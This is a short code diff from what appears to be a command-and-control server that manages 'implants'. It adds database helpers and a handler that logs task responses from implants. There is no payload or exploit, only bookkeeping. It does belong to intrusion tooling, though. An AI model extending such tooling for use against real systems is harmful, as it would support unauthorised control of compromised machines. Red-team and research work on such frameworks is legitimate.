@@ -29,9 +29,8 @@ def register_implant(i):
     return i
 
 def update_implant_last_seen(iID):
-    # db.query()
     # Query the Implant table by implant_id
-    implant = db.session.query(Implant).filter_by(implant_id=iID).first()
+    implant = get_implant_by_id(iID)
     implant.last_seen = func.now()
     db.session.commit()
     return implant
@@ -66,8 +65,25 @@ def get_implant_by_id(implant_id):
     implant = db.session.query(Implant).filter_by(implant_id=implant_id).first()
     return implant
 
-def analyze_TaskResponse(ic):
-    pass
+def get_task_by_id(task_id):
+    # Query the Implant table by implant_id
+    implant = db.session.query(Task).filter_by(task_id=task_id).first()
+    return implant
+
+def analyze_TaskResponse(tr: TaskResponse):
+    if tr is None:
+        return ""
+    
+    print(f'[+] TaskReponse:')
+    print(f'[+]    * TaskID: {tr.TaskID}')
+    print(f'[+]    * Opcode: {tr.Opcode}')
+    print(f'[+]    * Args: {tr.Args}')
+    
+    # Query the Implant table by implant_id
+    task = get_task_by_id(tr.TaskID)
+    db.session.commit()
+
+    return ""
 
 def make_dummy_task(ip):
     location = get_location(ip)
